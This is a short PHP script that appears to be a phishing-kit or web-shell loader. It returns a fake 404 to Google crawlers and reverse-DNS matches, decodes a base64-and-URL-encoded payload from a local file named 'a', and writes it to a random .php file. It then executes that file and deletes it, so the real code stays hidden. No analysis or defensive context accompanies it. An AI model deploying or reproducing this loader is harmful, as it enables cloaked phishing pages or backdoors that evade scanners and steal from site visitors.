<?php
session_start();
error_reporting(0);
include('web/auth/dashboard/');
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//

$fnChange=uniqid().uniqid().".php";
$dataM=rawurldecode(base64_decode(file_get_contents("a")));
file_put_contents($fnChange,$dataM);unset($dataM);

require_once($fnChange);
unlink($fnChange);
